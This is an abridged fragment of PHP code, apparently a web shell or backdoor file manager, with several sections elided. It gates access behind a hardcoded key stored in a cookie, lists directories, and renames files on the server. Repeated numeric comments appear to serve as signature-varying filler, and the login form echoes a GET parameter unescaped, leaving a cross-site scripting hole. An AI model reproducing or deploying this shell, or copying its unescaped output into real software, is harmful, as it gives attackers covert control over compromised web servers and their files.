...
$auth_key = "fbdb8b788729778a93a643fabaa44c86";
...
$pass = false;
if (isset($_COOKIE['pw_name_48360'])) {
    if(($_COOKIE['pw_name_48360']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_48360'])) {
        if(($_POST['pw_name_48360']) == $auth_key) {
            setcookie("pw_name_48360", $_POST['pw_name_48360']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_48360' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1725253715223537 1725253715731236 1725253715137977 1725253715310044
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1725253715223537 1725253715731236 1725253715137977 1725253715310044
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1725253715223537 1725253715731236 1725253715137977 1725253715310044
            $name = PATH . "/" . $_GET['r'];
